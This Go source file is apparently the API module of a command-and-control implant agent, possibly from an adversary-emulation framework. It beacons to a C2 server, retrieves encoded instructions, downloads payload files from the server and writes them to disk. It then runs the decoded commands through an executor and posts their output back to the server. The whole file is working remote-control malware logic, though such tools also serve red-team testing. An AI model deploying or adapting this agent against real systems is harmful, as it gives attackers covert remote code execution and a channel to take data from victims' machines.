package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"../execute"
	"../util"
)

const (
	ok = 200
)

//Ping tests connectivity to the server
func Ping(server string) bool {
	address := fmt.Sprintf("%s/sand/ping", server)
	bites := request(address, nil)
	if(string(bites) == "pong") {
		fmt.Println("[+] Connectivity established")
		return true;
	}
	fmt.Println("[+] Connectivity not established")
	return false;
}

//Instructions is a single call to the C2
func Instructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		fmt.Println("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["instructions"] = commands
	} else {
		fmt.Println("[-] beacon: DEAD")
	}
	return out
}

//DropPayloads downloads all required payloads for a command
func DropPayloads(payload string, server string) []string{
	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, drop(server, payload))
		}
	}
	return droppedPayloads
}

//ExecuteInstruction takes the command and profile and executes that command step
func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
	cmd := string(util.Decode(command["command"].(string)))
	var status string
	var result []byte
	missingPaths := util.CheckPayloadsAvailable(payloads)
	if len(missingPaths) == 0 {
		result, status = execute.Execute(cmd, command["executor"].(string), profile["platform"].(string))
	} else {
		result = []byte(fmt.Sprintf("Payload(s) not available: %s", strings.Join(missingPaths, ", ")))
		status = execute.ERROR_STATUS
	}
	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
}

func drop(server string, payload string) string {
	location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == ok {
			util.WritePayload(location, resp)
		}
	}
	return location
}

func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string) {
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", commandID.(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
	request(address, data)
	if cmd == "die" {
		fmt.Println("[+] Shutting down...")
		util.StopProcess(os.Getpid())
	}
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}
